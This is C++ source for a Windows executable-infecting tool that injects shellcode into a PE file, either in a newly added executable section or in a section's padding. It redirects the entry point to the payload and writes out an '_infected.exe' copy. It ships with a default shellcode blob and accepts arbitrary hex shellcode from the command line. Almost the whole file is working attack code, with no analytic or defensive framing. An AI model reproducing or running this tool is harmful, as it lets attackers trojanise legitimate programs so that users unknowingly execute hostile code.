#include <iostream>
#include <windows.h>
#include <w32api.h>
#include <Shlwapi.h>
#include <unistd.h>
#include <vector>

using namespace std;

char default_shellcode[] =
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
"\x49\x0b\x31\xc0\x51\x50\xff\xd7";

typedef struct PE_INFO {
    INT Size;
    INT StartOffset;
    INT EndOffset;

} PE_INFO, *PPE_INFO;


bool readBinFile(const char fileName[], char** bufPtr, DWORD& length){
    FILE* file;
    if (file = fopen(fileName, "rb")){
        fseek(file, 0, SEEK_END);
        length = ftell(file);
        *bufPtr = new char[length + 1];
        fseek(file, 0, SEEK_SET);
        fread(*bufPtr, sizeof(char), length, file);
        return true;
    }
    else {
        return false;
    }
}

int getAllign(int size, int allign){
    return ((size / allign) + 1) * allign;
}

size_t rvaToOffset(DWORD RVA, IMAGE_NT_HEADERS32* ntHdr, IMAGE_SECTION_HEADER* sctHdr){
    for(int i=0; i< ntHdr->FileHeader.NumberOfSections; i++){
        auto curSct = sctHdr[i];
        if(RVA >= curSct.VirtualAddress &&
                RVA <= curSct.VirtualAddress + curSct.Misc.VirtualSize){
            return curSct.PointerToRawData + (RVA - curSct.VirtualAddress);
        }
    }
    return 0;
}

size_t offsetToRva(DWORD raw_offset ,IMAGE_NT_HEADERS32* ntHdr, IMAGE_SECTION_HEADER* sctHdr){
    for(int i=0; i< ntHdr->FileHeader.NumberOfSections; i++){
        auto curSct = sctHdr[i];
        if(raw_offset >= curSct.PointerToRawData &&
                raw_offset <= curSct.PointerToRawData + curSct.SizeOfRawData){
            return curSct.VirtualAddress + (raw_offset - curSct.PointerToRawData);
        }

    }
    return 0;
}

vector<uint8_t> hexStringToByteArray(const string& hex) {
    vector<uint8_t> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        string byteString = hex.substr(i, 2);
        uint8_t byte = static_cast<char>(strtol(byteString.c_str(), nullptr, 16));
        bytes.push_back(byte);
    }
    return bytes;
}

void findPEInfo(IMAGE_NT_HEADERS32* ntHdr, IMAGE_SECTION_HEADER* secHdr, char* ptrToPad, char* outfile, PPE_INFO peInfo, size_t lenShell){

    int endOffset = 0;
    int startOffset = 0;

    for(auto i=0; i < ntHdr->FileHeader.NumberOfSections; i++){
        auto nextSect = secHdr[i+1];
        startOffset = nextSect.PointerToRawData - 1;
        ptrToPad = outfile+startOffset;
        while(!(*ptrToPad) && (secHdr[i].SizeOfRawData > 0)){
            ptrToPad -=1;
        }

        ptrToPad +=1;
        startOffset = ptrToPad - outfile;
        endOffset = nextSect.PointerToRawData - 1;
        size_t sizeOfPad = endOffset - startOffset + 1;
        peInfo[i].Size = sizeOfPad;
        peInfo[i].StartOffset = startOffset;
        peInfo[i].EndOffset = endOffset;

        if(sizeOfPad > lenShell){
            printf("[+] find %d padding in section %i\n", sizeOfPad, i+1);
            printf("[+] start offset @ 0x%x end offset @ 0x%x \n\n", startOffset, endOffset);
        }
    }

}


bool createNewSect(char *buff, DWORD fileSize,char *outfile, char *fileName, const char shellcode[], size_t lenShell){

    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*) buff;
    IMAGE_NT_HEADERS32* ntHdr = (IMAGE_NT_HEADERS32*) (size_t(dosHdr)+dosHdr->e_lfanew);
    IMAGE_SECTION_HEADER* secHdr = (IMAGE_SECTION_HEADER*)(size_t(ntHdr) + sizeof(*ntHdr));
    if(dosHdr->e_magic != IMAGE_DOS_SIGNATURE || ntHdr->Signature != IMAGE_NT_SIGNATURE){
        puts("[-] file may be broken");
        return 1;
    }

    auto fileAllign = ntHdr->OptionalHeader.FileAlignment;
    auto sectAllign = ntHdr->OptionalHeader.SectionAlignment;
    auto finalSize = fileSize + getAllign(lenShell, fileAllign);

    outfile = (char*)malloc(finalSize);
    puts("[+] copying original exe to new file");
    memcpy(outfile, buff, fileSize);


    IMAGE_DOS_HEADER* newDosHdr = (IMAGE_DOS_HEADER*) outfile;
    IMAGE_NT_HEADERS32* newNtHdr = (IMAGE_NT_HEADERS32*) (size_t(newDosHdr)+newDosHdr->e_lfanew);
    IMAGE_SECTION_HEADER* newSecHdr = (IMAGE_SECTION_HEADER*)(size_t(newNtHdr) + sizeof(*newNtHdr));

    if(newDosHdr->e_magic != IMAGE_DOS_SIGNATURE || newNtHdr->Signature != IMAGE_NT_SIGNATURE){
        puts("[-] file may be broken");
        return 1;
    }

    PIMAGE_SECTION_HEADER lastSectHdr = &newSecHdr[newNtHdr->FileHeader.NumberOfSections - 1];
    PIMAGE_SECTION_HEADER newSectHdr2 = lastSectHdr + 1;

    puts("[+] creating new section header");
    memcpy(newSectHdr2->Name, "new.scn", 8);


    newSectHdr2->SizeOfRawData = lenShell + (fileAllign - (lenShell % getAllign(lenShell, fileAllign)));
    newSectHdr2->Misc.VirtualSize = getAllign(lenShell, sectAllign);

    //Execute, read
    newSectHdr2->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;

    //virtual address
    //get shift from base address of image
    //note that you should use sectAllign because it is in sect header.
    newSectHdr2->VirtualAddress = getAllign(lastSectHdr->VirtualAddress + lastSectHdr->Misc.VirtualSize, sectAllign);
    newSectHdr2->PointerToRawData = lastSectHdr->PointerToRawData + lastSectHdr->SizeOfRawData;
    newNtHdr->FileHeader.NumberOfSections += 1;

    //Pointer is  the shift from base image address
    memcpy(outfile + newSectHdr2->PointerToRawData, shellcode, lenShell);

    puts("[+] repair virtual size");
    for (size_t i = 0; i < newNtHdr->FileHeader.NumberOfSections - 1; i++){
        newSecHdr[i].Misc.VirtualSize = newSecHdr[i+1].VirtualAddress - newSecHdr[i].VirtualAddress;
    }

    puts("[+] fix image size in memory");
    newNtHdr->OptionalHeader.SizeOfImage = newSectHdr2->VirtualAddress + newSectHdr2->Misc.VirtualSize;

    puts("[+] point EP to shellcode");
    newNtHdr->OptionalHeader.AddressOfEntryPoint = newSectHdr2->VirtualAddress;

    char outputPath[40];
    memcpy(outputPath, fileName, sizeof(outputPath));
    strncpy(strrchr(outputPath, '.'), "_infected.exe", 40);
    FILE* fout = fopen(outputPath, "wb");
    fwrite(outfile, 1, finalSize, fout);
    fclose(fout);

    printf("[+] file saved at %s\n", outputPath);
    puts("[+] done");

    return true;

}


bool injectInPadding(char *buff, DWORD fileSize,char *outfile, char *fileName, int number,const char shellcode[], size_t lenShell){
    IMAGE_DOS_HEADER* dsHdr = (IMAGE_DOS_HEADER*)buff;
    IMAGE_NT_HEADERS32* ntHdr = (IMAGE_NT_HEADERS32*)(size_t(dsHdr) + dsHdr->e_lfanew);
    IMAGE_SECTION_HEADER* secHdr = (IMAGE_SECTION_HEADER*)(size_t(ntHdr) + sizeof(*ntHdr));

    if(dsHdr->e_magic != IMAGE_DOS_SIGNATURE || ntHdr->Signature != IMAGE_NT_SIGNATURE){
        puts("[!] file may be broken!");
        return 1;
    }

    outfile = (char*)malloc(fileSize);
    memcpy(outfile, buff, fileSize);

    IMAGE_DOS_HEADER* newDosHdr = (IMAGE_DOS_HEADER*) outfile;
    IMAGE_NT_HEADERS32* newNtHdr = (IMAGE_NT_HEADERS32*) (size_t(newDosHdr)+newDosHdr->e_lfanew);
    IMAGE_SECTION_HEADER* newSecHdr = (IMAGE_SECTION_HEADER*)(size_t(newNtHdr) + sizeof(*newNtHdr));

    char* ptrToPad;
    puts("[+] finding size of padding in the sections");
    number -= 1;

    PPE_INFO peInfo = new PE_INFO[ntHdr->FileHeader.NumberOfSections];
    findPEInfo(ntHdr, secHdr, ptrToPad, outfile, peInfo, lenShell);

    printf("[+] check if there is enough place for shellcode \n");
    printf("[+] size of current shellcode is %i \n", lenShell);



    if(!(peInfo[number].Size > 0)){
        printf("[-] cant't inject in section %i", number+1);
        return 1;
    }

    int shell_start_offset = peInfo[number].StartOffset;
    ptrToPad = outfile + shell_start_offset;
    printf("[+] insert payload at @ 0x%08x \n", ptrToPad);


    memcpy(ptrToPad, shellcode, lenShell);
    printf("[+] payload injected in %i section at @  0x%08x \n", number+1, ptrToPad);
    printf("[+] check characteristics \n");

    if(newSecHdr[number].Characteristics != (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ)){

        newSecHdr[number].Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
        printf("[+] change characteristics to read and exec\n");

    }

    auto rva_address = offsetToRva(shell_start_offset, newNtHdr, newSecHdr);
    int entry = (DWORD)(rva_address);
    newNtHdr->OptionalHeader.AddressOfEntryPoint = entry;


    char outputPath[40];
    memcpy(outputPath, fileName, sizeof(outputPath));
    strncpy(strrchr(outputPath, '.'), "_infected.exe", 40);
    FILE* fout = fopen(outputPath, "wb");
    fwrite(outfile, 1, fileSize, fout);
    fclose(fout);
    printf("[+] file saved at %s\n", outputPath);
    puts("[+] done");

    return true;
}

int main(int argc, char** argv)
{
    int rezult = 0;
    char* buff;
    DWORD fileSize;
    char* injected;
    char* fileName;
    char* shellcode = default_shellcode;
    size_t size = sizeof(default_shellcode);
    bool padding = false;
    bool newSection = false;
    int number;



    while((rezult = getopt(argc, argv, "f:np:hs:")) != -1){
        switch(rezult) {
        case 'f':{
            if(!readBinFile(optarg, &buff, fileSize)){
                puts("[-] can't open file");
                return 1;
            }
            fileName = optarg;
            break;
        }
        case 'n':{
            newSection = true;
            break;
        }
        case 'p':{

            if(optarg){
                number = char(*optarg) - 48;
            }
            else{
                number = 1;
            }
            padding = true;
            break;
        }
        case 's':{
            vector<uint8_t> bytes = hexStringToByteArray(optarg);
            shellcode = new char[bytes.size()];
            memcpy(shellcode, bytes.data(), bytes.size());
            size = bytes.size();
            break;
        }
        case 'h':{
            puts("[!] usage ./PePathcer.exe [path/to/file] [-p/-n/-s]\n");
            puts("[info] -p [section number(default=1)] -> inject payload in padding \n -n -> create new section with payload\n -s [shellcode] -> shellcode in hex encoding");
            return 1;
        }
        case '?':{
            puts("[!] usage ./PePathcer.exe [path/to/file] [-p/-n/-s]\n");
            puts("[info] -p [section number(default=1)] -> inject payload in padding \n -n -> create new section with payload\n -s [shellcode] -> shellcode in hex encoding");
            return 1;
        }
        }

    }
//!TODO
//! make convertion from hex encoding to byte array!!! use hexStringToByteArray function

    if(padding){
        injectInPadding(buff, fileSize, injected, fileName, number, shellcode, size);
    }
    else if(newSection){
        createNewSect(buff, fileSize, injected, fileName, shellcode, size);
    }
    else{
        return 1;
    }
    return 0;
}
